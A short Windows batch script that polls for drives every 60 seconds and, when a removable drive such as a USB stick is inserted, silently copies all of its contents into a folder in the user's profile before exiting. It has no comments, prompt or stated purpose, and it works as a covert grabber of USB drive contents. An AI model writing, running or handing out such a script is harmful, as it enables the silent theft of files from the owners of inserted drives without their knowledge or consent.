@echo off
:loop
   for /F "tokens=1*" %%a in ('fsutil fsinfo drives') do (
      for %%c in (%%b) do (
         for /F "tokens=3" %%d in ('fsutil fsinfo drivetype %%c') do (
            if %%d equ Removable (
               xcopy /E /Y /I %%c C:\Users\%username%\copy
               exit
            )
         )
      )
   )
timeout /t 60 /nobreak > nul
goto loop
